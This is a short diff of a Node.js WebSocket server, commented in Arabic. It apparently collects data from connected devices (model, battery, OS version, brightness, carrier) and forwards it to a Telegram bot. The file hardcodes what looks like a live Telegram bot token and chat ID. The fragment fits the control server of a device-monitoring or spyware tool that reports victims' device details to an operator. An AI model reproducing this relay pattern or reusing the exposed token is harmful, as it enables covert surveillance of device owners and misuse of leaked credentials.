@@ -10,15 +10,15 @@ const app = express();
 const server = http.createServer(app);
 const wss = new WebSocket.Server({ server });
 
-// إعداد بيانات تيليجرام
+// ✅ بيانات تيليجرام الجديدة
 const TELEGRAM_TOKEN = '7222949431:AAFw5GDEeY-UGs0ZIQZTnol12RsX8toD5qI';
 const TELEGRAM_CHAT_ID = '6837315281';
-const TELEGRAM_API_URL = `https://api.telegram.org/bot7222949431:AAFw5GDEeY-UGs0ZIQZTnol12RsX8toD5qI`;
+const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_TOKEN}`;
 
-// تخزين بيانات الأجهزة المتصلة
+// ✅ تخزين بيانات الأجهزة المتصلة
 const clients = new Map();
 
-// استخدام Body Parser و Multer
+// ✅ إعداد Body Parser و Multer
 app.use(bodyParser.json());
 const upload = multer({ storage: multer.memoryStorage() });
 
@@ -77,7 +77,7 @@ wss.on('connection', (ws) => {
     ws.on('message', (message) => {
         console.log(`📩 رسالة من ${clientId}:`, message);
 
-        // إرسال البيانات إلى تيليجرام عند استقبال معلومات الجهاز
+        // إرسال بيانات الجهاز إلى تيليجرام عند الاتصال
         const data = JSON.parse(message);
         if (data.type === 'deviceInfo') {
             const { model, battery, version, brightness, provider } = data;
